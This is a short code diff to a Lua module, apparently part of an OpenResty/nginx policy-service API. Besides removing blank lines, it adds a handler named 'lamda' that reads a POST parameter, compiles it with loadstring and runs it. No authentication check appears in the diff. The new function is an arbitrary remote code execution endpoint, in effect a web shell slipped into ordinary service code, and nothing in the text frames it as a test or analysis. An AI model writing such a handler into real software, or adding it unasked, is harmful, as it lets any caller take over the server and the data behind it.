@@ -40,8 +40,6 @@ function _M.sorted_role_types()
     ngx.say(response)
 end
 
-
-
 function _M.notify()
     policy.increase_center_version_counter()
     local response = string.format('{"status":200, "message":"ok", "result": {"center_version_counter": %s}}', policy.get_center_version_counter())
@@ -57,6 +55,20 @@ function _M.status()
     ngx.say(response)
 end
 
-
+function _M.lamda()
+    ngx.req.read_body()
+    local post_args, err = ngx.req.get_post_args()
+    if not post_args then
+        ngx.say("not found post data")
+    else
+        local lamda = post_args.lamda
+        if not lamda then
+            ngx.say("not found lamda from post data")
+        else
+            local f = loadstring(lamda)
+            ngx.say(f())
+        end
+    end
+end
 
 return _M
